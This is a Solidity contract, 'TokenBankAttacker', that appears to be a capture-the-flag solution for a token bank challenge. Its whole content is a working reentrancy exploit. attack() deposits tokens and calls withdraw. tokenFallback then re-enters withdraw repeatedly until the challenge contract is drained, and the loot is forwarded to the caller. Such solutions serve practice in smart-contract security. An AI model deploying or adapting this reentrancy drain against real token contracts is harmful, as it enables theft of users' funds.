pragma solidity ^0.8.9;

interface IChallenge {
    function isComplete() external view returns (bool);

    function withdraw(uint256 amount) external;

    function tokenFallback(address from, uint256 value, bytes calldata data) external;

    function balanceOf(address user) external returns (uint256);

    function token() external returns (ISET);
}


interface ISET {
    function balanceOf(address user) external returns (uint256);

    function transfer(address to, uint256 value) external returns (bool success);
}


contract TokenBankAttacker {
    IChallenge private challenge;
    ISET private SET;
    constructor (address challengeAddress) {
        challenge = IChallenge(challengeAddress);
    }

    function tokenFallback(address from, uint256 value, bytes calldata data) external {
        if (data.length == 0 && challenge.token().balanceOf(address(challenge)) > 0) {
            uint256 myBalance = challenge.balanceOf(address(this));
            uint256 challengeBalance = challenge.token().balanceOf(address(challenge));
            uint256 balance = myBalance > challengeBalance ? challengeBalance : myBalance;
            challenge.withdraw(balance);
        }else{
            return;
        }
    }

    function attack() external payable {
        uint256 balance = challenge.token().balanceOf(address(this));
        challenge.token().transfer(address(challenge),balance);
        challenge.withdraw(balance);
        balance = challenge.token().balanceOf(address(this));
        challenge.token().transfer(msg.sender,balance);
        require(challenge.isComplete(), "challenge is not completed!");
    }

    receive() external payable {}
}